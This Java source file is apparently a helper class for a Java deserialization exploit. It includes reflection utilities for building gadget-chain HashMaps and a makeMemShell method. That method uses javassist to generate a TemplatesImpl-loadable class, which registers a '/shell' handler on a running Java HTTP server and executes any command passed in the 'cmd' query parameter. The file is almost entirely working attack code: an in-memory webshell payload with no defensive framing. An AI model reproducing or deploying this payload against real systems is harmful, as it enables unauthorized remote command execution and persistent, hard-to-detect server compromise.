import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Utils {
    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, String fieldName, final Object value) throws Exception {
        Field field;
        if (fieldName.contains(".")) {
            fieldName = fieldName.split("\\.")[1];
            field = getField(obj.getClass().getSuperclass(), fieldName);
        } else {
            field = getField(obj.getClass(), fieldName);
        }
        field.set(obj, value);
    }

    public static TemplatesImpl makeMemShell() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("shellTest" + System.nanoTime());

        pool.insertClassPath(new ClassClassPath(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet")));
        pool.insertClassPath(new ClassClassPath(Class.forName("com.sun.net.httpserver.HttpHandler")));
        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        clazz.setInterfaces(new CtClass[]{pool.get(HttpHandler.class.getName())});

        clazz.addConstructor(CtNewConstructor.make("public shellTest() {\n" +
                "        super();\n" +
                "        try {\n" +
                "            Object obj = Thread.currentThread();\n" +
                "            java.lang.reflect.Field field = obj.getClass().getDeclaredField(\"group\");\n" +
                "            field.setAccessible(true);\n" +
                "            obj = field.get(obj);\n" +
                "\n" +
                "            field = obj.getClass().getDeclaredField(\"threads\");\n" +
                "            field.setAccessible(true);\n" +
                "            obj = field.get(obj);\n" +
                "            Thread[] threads = (Thread[]) obj;\n" +
                // https://github.com/jboss-javassist/javassist/issues/403
                "            for (int i = 0; i < threads.length; i++) {\n" +
                "                if (threads[i].getName().contains(\"Thread-2\")) {\n" +
                "                    try {\n" +
                "                        field = threads[i].getClass().getDeclaredField(\"target\");\n" +
                "                        field.setAccessible(true);\n" +
                "                        obj = field.get(threads[i]);\n" +
                "\n" +
                "                        field = obj.getClass().getDeclaredField(\"this$0\");\n" +
                "                        field.setAccessible(true);\n" +
                "                        obj = field.get(obj);\n" +
                "\n" +
                // https://stackoverflow.com/questions/55376602/error-getmethodjava-lang-string-java-lang-class-java-lang-class-not-found-in-j
                "                        java.lang.reflect.Method createContext = obj.getClass().getMethod(\"createContext\", new Class[] {String.class, com.sun.net.httpserver.HttpHandler.class});\n" +
                "                        createContext.setAccessible(true);\n" +
                "                        createContext.invoke(obj, new Object[] {\"/shell\", this});\n" +
                "                    } catch (Exception e) {\n" +
                "                        System.out.println(e);\n" +
                "                        e.printStackTrace();\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "        }}", clazz));

        clazz.addMethod(CtMethod.make("public void handle(com.sun.net.httpserver.HttpExchange t) throws java.io.IOException {\n" +
                "        String response = \"\";\n" +
                "        String query = t.getRequestURI().getQuery();\n" +
                "        String[] var = query.split(\"=\");\n" +
                "        java.io.ByteArrayOutputStream output = null;\n" +
                "        if (var[0].equals(\"cmd\")) {\n" +
                "            java.io.InputStream inputStream = Runtime.getRuntime().exec(var[1]).getInputStream();\n" +
                "            output = new java.io.ByteArrayOutputStream();\n" +
                "            byte[] buffer = new byte[4096];\n" +
                "            int n = 0;\n" +
                "            while (-1 != (n = inputStream.read(buffer))) {\n" +
                "                output.write(buffer, 0, n);\n" +
                "            }\n" +
                "        }\n" +
                "        if (output != null) {\n" +
                "            response += (\"\\n\" + output);\n" +
                "            t.sendResponseHeaders(200, (long) response.length());\n" +
                "            java.io.OutputStream os = t.getResponseBody();\n" +
                "            os.write(response.getBytes());\n" +
                "            os.close();\n" +
                "        }" +
                "    }", clazz));

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] {clazz.toBytecode()});
        setFieldValue(templates, "_name", "RandomString");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }
}
